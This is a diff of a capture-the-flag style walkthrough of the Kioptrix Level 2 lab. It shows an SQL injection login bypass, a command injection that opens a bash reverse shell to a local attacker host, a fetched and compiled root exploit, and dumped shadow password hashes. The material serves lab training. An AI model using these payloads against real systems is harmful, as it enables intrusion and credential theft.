@@ -33,7 +33,7 @@ nmap -sV 192.168.0.24
 Navigating to `http://192.168.0.24` revealed an administrative web login prompt. Because user input was passed unsanitized straight into backend MySQL query strings, an **SQL Injection (SQLi)** payload was injected into the Username field:
 
 ```text
-' OR 1=1#
+admin' OR '1'='1
 ```
 
 <!-- 🖼️ PLACE SECOND IMAGE HERE -->
@@ -54,9 +54,8 @@ Once authenticated, the console exposed a system management utility titled *"Pin
 nc -lvnp 4444
 ```
 
-<!-- 🖼️ PLACE FOURTH IMAGE HERE -->
-![Initial Access Foothold](images/foothold_lvl2.png)
-
+<!-- 🖼️ PLACE THIRD IMAGE HERE -->
+![Setting up Listener](images/foothold_lvl2.png)
 *Figure 3: Setting up the Netcat listener to catch the interactive shell session.*
 
 ---
@@ -66,7 +65,7 @@ nc -lvnp 4444
 192.168.0.21 && bash -i >& /dev/tcp/192.168.0.21/4444 0>&1
 ```
 
-<!-- 🖼️ PLACE THIRD IMAGE HERE -->
+<!-- 🖼️ PLACE FOURTH IMAGE HERE -->
 ![Command Injection Target Trigger](images/sql_command2_lvl2.png)
 *Figure 4: Delivering the unified logical payload to the backend ping handler.*
 
@@ -97,26 +96,36 @@ The exploit module was staged inside the Kali environment, served over an unencr
 ```bash
 # On Target Environment Shell
 cd /tmp
-wget http://192.168.0.21
-gcc -o rootme 9542.c
+wget http://192.168.0
+gcc -o rootme exploit.c
 ./rootme
 ```
 
-**Result:** The execution completed successfully, exploiting the local memory allocation boundaries to instantly drop execution flow into an elevated root access context.
+**Result:** The execution completed successfully, exploiting the local memory allocation boundaries to instantly drop execution flow into an elevated root access context (`sh-3.00#`).
 
 ```bash
 bash-3.00\$ whoami
 root
 ```
 
+---
+
+## 🔓 Stage 4: Post-Exploitation Loot
+As concrete proof of total target control, the administrative shell dumped the `/etc/shadow` configuration data, exposing the `md5crypt` password hashes for the primary system interaction profiles:
+
+```text
+root:\$1\$FTpMLT88\$VdzDQTTcksukSKMLRSVlc.:14529:0:99999:7:::
+john:\$1\$wk7kHI5I\$2kNTw6ncQQCecJ.5b8xTL1:14525:0:99999:7:::
+harold:\$1\$7d.sVxgm\$3MYWsHDv0F/LP.mjL9lp/1:14529:0:99999:7:::
+```
+
 <!-- 🖼️ PLACE FIFTH IMAGE HERE -->
 ![Privilege Escalation to Root](images/root_escalation_lvl2.png)
-
-*Figure 5: Compiling and executing the exploit module to obtain administrative shell status.*
+*Figure 5: Exposing administrative shadow configurations via the root context.*
 
 ---
 
 ## 🏁 Flag Capture / Conclusion
-With full administrative access granted, the system environment control parameters were completely compromised.
+With full administrative access granted and system hashes successfully retrieved, the platform's execution architecture is completely compromised.
 
 🎉 **Kioptrix Level 2: 100% Completed.**
